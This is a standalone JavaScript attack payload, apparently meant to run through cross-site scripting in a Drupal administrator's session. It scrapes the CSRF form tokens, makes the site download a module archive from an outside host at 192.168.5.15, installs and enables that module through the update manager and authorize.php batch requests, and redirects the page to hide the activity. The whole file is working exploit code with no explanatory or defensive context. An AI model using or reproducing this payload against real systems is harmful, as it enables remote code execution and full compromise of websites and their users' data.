const exploitURL = "http://192.168.5.15/hello_world.tar.gz";
const req = new XMLHttpRequest();
req.open("GET", "/admin/modules", false);
req.send(null);
req.open("GET", "/admin/modules/install", false);
req.send(null);
const formBuildId = req.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
const formToken = req.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];
const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
const boundary = "-----------------------------" + genRandHex(28);
var formData = new FormData();
formData.append("project_url", exploitURL);
formData.append("files[project_upload]", "");
formData.append("form_build_id", formBuildId);
formData.append("form_token", formToken);
formData.append("form_id", "update_manager_install_form");
formData.append("op", "Continue");
req.open("POST", "/admin/modules/install", true);
req.send(formData);
req.onreadystatechange = function() {
  if ((req.readyState == XMLHttpRequest.DONE) && (req.responseURL.match("batch="))) {
    const batch = req.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[1];
    const id = req.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[2];
    req.open("POST", "/core/authorize.php/core/authorize.php?batch=" + batch + "&id=" + id + "&op=do_nojs&op=do&_format=json", true);
    req.send(null);
    req.onreadystatechange = function() {
      if (req.readyState == XMLHttpRequest.DONE) {
        req.open("GET", "/core/authorize.php/core/authorize.php?batch=" + batch + "&id=" + id + "&op=do_nojs&op=finished", true);
        req.send(null);
        req.onreadystatechange = function() {
          if (req.readyState == XMLHttpRequest.DONE) {
            if (req.responseText.match("Files were added successfully")) {
              req.open("GET", "/admin/modules", false);
              req.send(null);
              const formBuildId = req.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
              const formToken = req.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];
              const bodyData = "modules%5B" + exploitURL.split("/")[3].split(".")[0] + "%5D%5Benable%5D=1&form_build_id=" + formBuildId + "&form_token=" + formToken + "&form_id=system_modules&op=Install";
              req.open("POST", "/admin/modules", true);
              req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
              req.send(bodyData);
              req.onreadystatechange = function() {
                if (req.readyState == XMLHttpRequest.DONE) {
                  window.location.replace("/admin/content");
                }
              }
            }
          }
        }
      }
    }
  }
}
